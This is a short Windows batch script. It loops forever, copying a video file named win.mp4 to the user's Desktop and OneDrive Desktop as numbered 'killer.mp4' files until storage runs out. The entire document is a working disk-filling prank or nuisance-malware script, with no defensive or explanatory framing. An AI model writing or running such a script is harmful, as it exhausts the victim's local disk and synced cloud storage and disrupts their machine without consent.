@echo off
set stone=0

:loop
set /a stone=%stone% + 1
copy .\win.mp4 %userprofile%\Desktop\%stone%killer.mp4
copy .\win.mp4 %onedrive%\Desktop\%stone%killer.mp4
echo %stone%
goto loop